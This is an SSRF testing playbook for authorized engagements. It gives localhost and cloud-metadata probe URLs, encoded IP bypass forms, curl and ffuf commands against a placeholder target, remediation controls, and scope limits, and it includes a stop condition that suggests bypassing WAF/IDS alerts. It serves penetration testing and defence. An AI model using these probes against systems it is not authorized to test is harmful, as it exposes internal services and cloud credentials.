# SSRF (Server-Side Request Forgery) — Playbook

## Classification
- **OWASP Top 10:** A10 — Server-Side Request Forgery (SSRF)
- **CWE:** CWE-918
- **Severity:** High / Critical
- **Scope:** Internal network scanning, cloud metadata access, service enumeration

## Types

| Type | Description | Detection Hint |
|------|-------------|----------------|
| **Basic SSRF** | Server fetches a URL we control and returns the response body directly | Response contains the fetched content |
| **Blind SSRF** | Server fetches a URL but does not return the response content; observable only via side effects (timing, DNS, outbound requests) | Use collaborator / out-of-band detection |
| **Semi-blind SSRF** | Response is partially reflected (e.g., error messages contain fetched data, or response metadata betrays internal state) | Partial content in errors or headers |

## Detection Payloads

Test each parameter or endpoint that accepts a URL, host, or file path:

### Localhost probes
```
http://localhost
http://127.0.0.1
http://127.0.0.1:22
http://127.0.0.1:80
http://127.0.0.1:443
http://127.0.0.1:8080
http://[::1]
http://0.0.0.0
http://0.0.0.0:22
```

### Cloud metadata endpoints
```
http://169.254.169.254/latest/meta-data/
http://169.254.169.254/latest/user-data/
http://169.254.169.254/metadata/instance?api-version=2021-02-01  (Azure)
http://metadata.google.internal/computeMetadata/v1/  (GCP — requires Metadata-Flavor: header)
```

### DNS rebinding / alternative representations
```
http://localhost/
http://lvh.me/
http://spoofed.burpcollaborator.net
http://127.1/
http://0x7f000001/
http://2130706433/
http://017700000001/
http://127.0.0.1.nip.io/
```

## Tools

| Tool | Usage |
|------|-------|
| **curl** | Manual probe: `curl -v 'http://target.com/fetch?url=http://127.0.0.1:22'` |
| **ffuf** | Parameter fuzzing for SSRF: `ffuf -u 'http://target.com/page?FUZZ=http://127.0.0.1' -w /path/to/parameters.txt -fr "error"` |
| **ssrfmap** | Automated SSRF exploitation (if installed): `python3 ssrfmap.py -r request.txt -p url` |
| **Burp Collaborator / interactsh** | Blind SSRF detection via out-of-band callbacks |

### Example: curl probe
```bash
curl -s -o /dev/null -w "%{http_code}" 'http://target.com/fetch?url=http://127.0.0.1:22'
# Non-empty / unexpected response suggests SSRF
```

### Example: ffuf parameter fuzzing
```bash
ffuf -u 'http://target.com/api/v1/FUZZ=http://127.0.0.1:22' \
     -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt \
     -mc all -fc 400,404
```

## Internet Research Queries
- `<product> SSRF exploit`
- `SSRF bypass techniques`
- `cloud metadata SSRF`
- `AWS metadata endpoint SSRF`
- `blind SSRF detection interactsh`
- `CVE-<year>-<id> SSRF`

## Safe PoC

Goal: **Demonstrate the server can reach internal resources — without causing harm.**

1. Probe an internal service that is **read-only** and **non-sensitive**:
   ```bash
   curl -v 'http://target.com/fetch?url=http://127.0.0.1:22'
   # SSH banner indicates SSRF to localhost:22 — good evidence
   ```

2. Compare response with a normal external URL:
   ```bash
   curl -v 'http://target.com/fetch?url=http://example.com'
   # Response from example.com is the baseline
   # Response from 127.0.0.1:22 showing SSH banner proves internal access
   ```

3. For cloud metadata (AWS), read only the metadata root path — **do not extract credentials**:
   ```bash
   curl -v 'http://target.com/fetch?url=http://169.254.169.254/latest/meta-data/'
   ```

## Evidence to Save

Collect and save:
- **Full HTTP request** (method, URL, headers, body)
- **Full HTTP response** (status, headers, body)
- **Side-channel evidence**: collaborator callback timestamp + DNS lookup logs
- Screenshot or terminal output showing internal service banner/metadata root

Store in `$ENG_DIR/evidence/exploitation/ssrf/` with a descriptive filename:
- `YYYY-MM-DD_ssrf-localhost-22_request.txt`
- `YYYY-MM-DD_ssrf-localhost-22_response.txt`

## Remediation Guidance

| Control | Description |
|---------|-------------|
| **URL allowlists** | Only permit requests to a curated list of trusted domains / IP ranges |
| **Disable redirect following** | Block or limit HTTP redirect chains that could bypass initial validation |
| **Network segmentation** | Restrict application-tier outbound access; use firewalls to block egress to internal ranges |
| **Metadata endpoint protection** | For cloud deployments, use IMDSv2 (AWS), or block 169.254.169.254 at the network level |
| **Input validation** | Reject unexpected URL schemes (e.g., `file://`, `dict://`, `gopher://`) |
| **No user-controlled host** | Avoid passing user-supplied input directly into URL-fetching functions |
|| **Allowlist-based DNS resolution** | Resolve hostnames server-side and compare against an allowlist of IPs before connecting |

## Stop Conditions
- Payload causes unexpected server behavior (crash, timeout, full response change) → pause and assess
- Access to sensitive data discovered that exceeds scope → stop and notify
- Exploitation attempt triggers WAF/IDS alert → note and attempt bypass or escalate

## Blocked Actions
- **Do NOT** extract or save cloud metadata credentials (e.g., IAM keys, tokens)
- **Do NOT** write data to internal services (e.g., PUT/POST to internal APIs, databases, Redis)
- **Do NOT** port-scan internal networks aggressively — focus on the vulnerable endpoint only
- **Do NOT** attempt RCE via SSRF unless explicitly authorized and scoped
- **Do NOT** use SSRF to read sensitive files from the server filesystem (`file://` — consider path-traversal playbook instead)
